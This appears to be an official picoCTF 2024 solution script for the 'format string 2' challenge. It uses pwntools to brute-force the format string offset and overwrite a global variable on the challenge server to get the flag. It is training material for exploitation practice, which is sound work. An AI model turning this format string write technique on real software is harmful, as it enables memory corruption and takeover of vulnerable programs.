# Official writeup of format string 2 (picoCTF 2024)


# this script is written if you want to brute force the offset 
# and set a target value to a variable whose address is known

from pwn import *

context.log_level = "critical"
context.binary = ELF('./vuln')

p = remote('rhea.picoctf.net', 64167)

def exec_fmt(payload):
    p = remote('rhea.picoctf.net', 64167)
    p.sendline(payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

payload = fmtstr_payload(offset, {0x404060: 0x67616c66})

p.sendline(payload)

flag = p.recvall()

print("Flag: ", flag)